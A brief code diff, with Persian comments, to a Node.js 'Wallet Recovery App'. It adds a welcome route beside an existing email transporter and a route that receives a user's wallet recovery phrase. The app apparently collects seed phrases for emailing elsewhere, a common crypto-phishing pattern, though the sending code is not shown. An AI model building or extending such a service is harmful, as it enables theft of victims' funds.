@@ -20,6 +20,11 @@ const transporter = nodemailer.createTransport({
     }
 });
 
+// مسیر پیش‌فرض برای آدرس ریشه
+app.get('/', (req, res) => {
+    res.send('Welcome to the Wallet Recovery App!');
+});
+
 // مسیری برای ارسال اطلاعات
 app.post('/send-recovery', (req, res) => {
     const { recoveryPhrase } = req.body;
